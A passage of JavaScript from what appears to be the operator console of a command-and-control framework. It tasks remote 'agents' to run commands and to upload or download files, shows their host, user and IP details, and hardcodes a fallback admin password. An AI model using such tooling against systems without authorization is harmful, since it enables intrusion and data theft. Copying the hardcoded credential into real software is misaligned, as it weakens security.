            printToConsole(`<span style="color:#ff0000">[!] Local file not found: ${localPath}</span>`);
            return null;
        }
        const fileBuf = fs.readFileSync(localPath);
        const fileB64 = fileBuf.toString('base64');
        const filename = path.basename(localPath);
        const data = {
            type: 'upload',
            filename,
            file_data: fileB64,
            file_path: remotePath || filename,
            remote_path: remotePath || filename
        };
        if (agentId) data.agent_id = agentId;
        const result = await prepareRequest({ path: '/api/client/task', method: 'POST' }, data);
        return result && result.success ? result.task_id : (printToConsole(`<span style="color:#ff0000">✗ Failed to create upload task</span>`), null);
    } catch (e) {
        printToConsole(`<span style="color:#ff0000">[!] Upload error: ${e.message}</span>`);
        return null;
    }
}

async function prepareRequest({ hostname = 'localhost', port = 5000, path = '/', method = 'GET', headers = {} }, data = null) {
    try {
        const body = data ? JSON.stringify(data) : null;
        if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
        if (!headers['Accept']) headers['Accept'] = 'application/json';
        // Inject Basic Auth via main config
        try {
            const cfg = await ipcRenderer.invoke('get-config');
            const user = (cfg && cfg.username) ? cfg.username : 'admin';
            const pass = (cfg && cfg.password) ? cfg.password : 'gnuDh8VYUYBnHx2Zv3k';
            headers['Authorization'] = 'Basic ' + Buffer.from(`${user}:${pass}`).toString('base64');
        } catch (_) {}
        const res = await ipcRenderer.invoke('prepare-request', { hostname, port, path, method, headers, body });
        if (res && res.error) throw new Error(res.error);
        if (typeof res === 'string') {
            try {
                return JSON.parse(res);
            } catch (_) {
                // Not JSON
                return null;
            }
        }
        return res || null;
    } catch (e) {
        log(`[!] prepareRequest error: ${e.message}`);
        return null;
    }
}

// Task monitoring function (returns details for history saving)
async function monitorTask(taskId, interval = 2) {
    return new Promise((resolve) => {
        const checkTask = async () => {
            try {
                const result = await prepareRequest({ path: `/api/client/task/${taskId}`, method: 'GET' });
                if (!result || !result.success) {
                    setTimeout(checkTask, interval * 1000);
                    return;
                }
                const task = result.task || {};
                const status = task.status;
                log(`[+] Task Status: ${status}`);
                if (status === 'completed') {
                    log(`[+] Task Completed`);
                    const taskType = task.type;
                    const taskResult = (task.result && task.result.result) || {};
                    const taskSuccess = (task.result && task.result.success) === true;
                    let stdoutAgg = '';
                    let stderrAgg = '';
                    if (taskType === 'download') {
                        // Handle file saving
                        const downloadsDir = ensureDownloadsDir();
                        if (downloadsDir && taskResult.file_data) {
                            try {
                                let filename = taskResult.filename || (taskResult.file_path ? path.basename(taskResult.file_path) : `download_${taskId}`);
                                let localPath = path.join(downloadsDir, filename);
                                if (fs.existsSync(localPath)) {
                                    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                                    const parsed = path.parse(filename);
                                    filename = `${timestamp}_${parsed.name}${parsed.ext}`;
                                    localPath = path.join(downloadsDir, filename);
                                }
                                const fileBuffer = Buffer.from(taskResult.file_data, 'base64');
                                fs.writeFileSync(localPath, fileBuffer);
                                const msg = `Downloaded: ${localPath}`;
                                printToConsole(`<span style="color:#00ff00">✓ ${msg}</span>`);
                                stdoutAgg += msg;
                            } catch (e) {
                                printToConsole(`<span style="color:#ff0000">✗ Failed to save download: ${e.message}</span>`);
                                stderrAgg += e.message;
                            }
                        } else {
                            printToConsole(`<span style="color:#ff0000">✗ No file data received</span>`);
                            stderrAgg += 'No file data received';
                        }
                    } else {
                        // Generic stdout/stderr display
                        if (taskResult.stdout) {
                            printToConsole(`<span style="color:#ffffff">${taskResult.stdout}</span>`);
                            stdoutAgg += taskResult.stdout;
                        }
                        if (taskResult.stderr) {
                            printToConsole(`<span style="color:#ff6666">${taskResult.stderr}</span>`);
                            stderrAgg += taskResult.stderr;
                        }
                    }
                    resolve({ raw: result, success: taskSuccess, stdout: stdoutAgg, stderr: stderrAgg });
                } else if (status === 'failed') {
                    const errText = (task.result && task.result.result && task.result.result.stderr) || 'Unknown error';
                    printToConsole(`<span style="color:#ff0000">✗ Task failed: ${errText}</span>`);
                    resolve({ raw: result, success: false, stdout: '', stderr: errText });
                } else {
                    // Task still running, check again in interval seconds
                    setTimeout(checkTask, interval * 1000);
                }
            } catch (error) {
                log(`[!] monitorTask error: ${error.message}`);
                printToConsole(`<span style="color:#ff0000">✗ Error monitoring task: ${error.message}</span>`);
                resolve({ raw: null, success: false, stdout: '', stderr: error.message });
            }
        };
        
        checkTask();
    });
}

window.addEventListener('DOMContentLoaded', async () => {
    try {
        const input = document.getElementById('consoleInput');
        if (input) {
            input.focus();
            try { input.setSelectionRange(input.value.length, input.value.length); } catch (_) {}
            // auto-resize on user input
            autoResizeTextArea(input);
            // remove any residual dynamic resize by normalizing height
            input.style.height = '36px';
            input.addEventListener('input', () => {
                autoResizeTextArea(input);
                if (inSearchMode) updateSearchDropdown(input);
            });
            input.addEventListener('keydown', (event) => {
                const isAccel = event.ctrlKey || event.metaKey;
                // Ctrl/Cmd+C clears the input box
                if (isAccel && (event.key === 'c' || event.key === 'C')) {
                    event.preventDefault();
                    input.value = '';
                    hideCommandDropdown();
                    currentCommandIndex = global.commandHistory.length;
                    return;
                }
                // History navigation
                if (event.key === 'ArrowUp') {
                    event.preventDefault();
                    if (inSearchMode) {
                        if (dropdownSelectedIndex > 0) {
                            dropdownSelectedIndex -= 1;
                            updateDropdownHighlight();
                        }
                    } else if (currentCommandIndex > 0) {
                        currentCommandIndex -= 1;
                        input.value = global.commandHistory[currentCommandIndex] || '';
                        try { input.setSelectionRange(input.value.length, input.value.length); } catch (_) {}
                    }
                    return;
                }
                if (event.key === 'ArrowDown') {
                    event.preventDefault();
                    if (inSearchMode) {
                        if (filteredHistory && dropdownSelectedIndex < Math.min(filteredHistory.length, 10) - 1) {
                            dropdownSelectedIndex += 1;
                            updateDropdownHighlight();
                        }
            } else if (currentCommandIndex < global.commandHistory.length) {
                        currentCommandIndex += 1;
                        input.value = global.commandHistory[currentCommandIndex] || '';
                        try { input.setSelectionRange(input.value.length, input.value.length); } catch (_) {}
                autoResizeTextArea(input);
                    }
                    return;
                }
                // Ctrl+R search
                if ((event.ctrlKey || event.metaKey) && (event.key === 'r' || event.key === 'R')) {
                    event.preventDefault();
                    inSearchMode = true;
                    updateSearchDropdown(input);
                    return;
                }
                // Enter confirms dropdown selection when in search mode
                if (event.key === 'Enter' && inSearchMode) {
                    event.preventDefault();
                    event.stopPropagation();
                    acceptDropdownSelection(input);
                    return;
                }
                // Escape to exit search
                if (event.key === 'Escape' && inSearchMode) {
                    hideCommandDropdown();
                    return;
                }
                // Tab to autocomplete first match
                if (event.key === 'Tab' && inSearchMode) {
                    event.preventDefault();
                    acceptDropdownSelection(input);
                    autoResizeTextArea(input);
                    return;
                }
            }, true);
        }
        input.addEventListener('keydown', (event) => {
            try {
                if (event.key === 'Enter') {
                    if (!event.shiftKey) {
                        event.preventDefault();
                        log(`Sending Enter key press event`);
                        sendCommand();
                    }
                } 
            } catch (error) {
                log(`[!] keydown event ${error.message}\r\n${error.stack}`);
            }
        });

        // Global keybindings for Copy/Paste/Select All
        document.addEventListener('keydown', (event) => {
            const isAccel = event.ctrlKey || event.metaKey;
            if (isAccel && (event.key === 'z' || event.key === 'Z')) {
                // Undo / Redo via Shift+Z
                event.preventDefault();
                try {
                    if (event.shiftKey) {
                        document.execCommand('redo');
                    } else {
                        document.execCommand('undo');
                    }
                } catch (_) {}
            } else if (isAccel && (event.key === 'c' || event.key === 'C')) {
                event.preventDefault();
                ipcRenderer.send('copy');
            } else if (isAccel && (event.key === 'v' || event.key === 'V')) {
                event.preventDefault();
                ipcRenderer.send('paste');
            } else if (isAccel && (event.key === 'a' || event.key === 'A')) {
                event.preventDefault();
                try { document.execCommand('selectAll'); } catch (_) {}
            }
        });

        // Right-click context menu (Copy, Paste, Select All)
        if (Menu) {
            const contextMenu = Menu.buildFromTemplate([
                { label: 'Undo', accelerator: 'CmdOrCtrl+Z', click: () => { try { document.execCommand('undo'); } catch (_) {} } },
                { label: 'Redo', accelerator: 'CmdOrCtrl+Shift+Z', click: () => { try { document.execCommand('redo'); } catch (_) {} } },
                { type: 'separator' },
                { label: 'Copy', accelerator: 'CmdOrCtrl+C', click: () => ipcRenderer.send('copy') },
                { label: 'Paste', accelerator: 'CmdOrCtrl+V', click: () => ipcRenderer.send('paste') },
                { type: 'separator' },
                { label: 'Select All', accelerator: 'CmdOrCtrl+A', click: () => { try { document.execCommand('selectAll'); } catch (_) {} } }
            ]);
            document.addEventListener('contextmenu', (e) => {
                e.preventDefault();
                contextMenu.popup();
            });
        }

        // Receive test command from Command Test window
        ipcRenderer.on('agent-run-command', (event, payload) => {
            try {
                const cmd = (payload && payload.cmd) ? String(payload.cmd) : '';
                const inputEl = document.getElementById('consoleInput');
                if (!cmd) return;
                if (inputEl) {
                    inputEl.value = cmd;
                }
                sendCommand();
            } catch (e) { log(`[agent-run-command] ${e.message}`); }
        });

        ipcRenderer.on('agent-data', (event, agent) => {
            try {
                log(`agent.js | agent : ${JSON.stringify(agent)}`);
                
                // Create global agent object from the received agent data
                global.agent = new Agent(agent);
                
                // Load and render last 100 history entries for this host
                loadAndRenderHistory();
                // Start polling for history updates every 3s
                setInterval(pollAndRenderHistoryUpdates, 3000);

                // Update the agent table with the received data
                const agentDataRow = document.getElementById('agentDataRow');
                if (agentDataRow) {
                    agentDataRow.cells[0].textContent = global.agent.agent_id;
                    agentDataRow.cells[1].textContent = global.agent.hostname;
                    agentDataRow.cells[2].textContent = global.agent.username;
                    agentDataRow.cells[3].textContent = global.agent.pid;
                    agentDataRow.cells[4].textContent = global.agent.ip_addresses;
                    agentDataRow.cells[5].textContent = global.agent.os_info;
                    agentDataRow.cells[6].textContent = global.agent.last_seen;
                }
                
                // Start periodic updates
                setInterval(updateCheckin, 1000);
                
            } catch (error) {
                log(`[!] agent-data ${error.message}\r\n${error.stack}`);
            }
        });
    } catch (error) {
        log(`[!] DOMContentLoaded ${error.message}\r\n${error.stack}`);
    }
});

function splitStringWithQuotes(str) {
    const result = [];
    let current = '';
    let insideQuotes = false;
    let quoteChar = '';
    for (let i = 0; i < str.length; i++) {
        const char = str[i];
        if (insideQuotes) {
            if (char === '\\' && (str[i + 1] === quoteChar || str[i + 1] === '\\')) {
                current += str[i + 1];
                i++;
            } else if (char === quoteChar) {
                insideQuotes = false;
                result.push(current);
                current = '';
            } else {
                current += char;
            }
        } else {
            if (char === '"' || char === "'") {
                insideQuotes = true;
                quoteChar = char;
            } else if (char === '\\' && str[i + 1] === ' ') {
                current += ' ';
                i++;
            } else if (char === ' ') {
                if (current.length > 0) {
                    result.push(current);
                    current = '';
                }
            } else {
                current += char;
            }
        }
    }
    if (current.length > 0) {
        result.push(current);
    }
    return result;
}

function getFormattedTimestamp() {
    const now = new Date();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const year = now.getFullYear();
    let hours = now.getHours();
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12;
    hours = hours ? hours : 12;
    const timezoneInitials = now.toLocaleTimeString('en-us', { timeZoneName: 'short' }).split(' ')[2];
    const formattedTimestamp = `${month}-${day}-${year} ${hours}:${minutes}${ampm} ${timezoneInitials}`;
    return formattedTimestamp;
}

function formatTimestampLikePS1(isoTs) {
    try {
        const d = isoTs ? new Date(isoTs) : new Date();
        const month = String(d.getMonth() + 1).padStart(2, '0');
        const day = String(d.getDate()).padStart(2, '0');
        const year = d.getFullYear();
        let hours = d.getHours();
        const minutes = String(d.getMinutes()).padStart(2, '0');
        const ampm = hours >= 12 ? 'PM' : 'AM';
        hours = hours % 12; hours = hours ? hours : 12;
        const tz = d.toLocaleTimeString('en-us', { timeZoneName: 'short' }).split(' ')[2];
        return `${month}-${day}-${year} ${hours}:${minutes}${ampm} ${tz}`;
    } catch (_) {
        return getFormattedTimestamp();
    }
}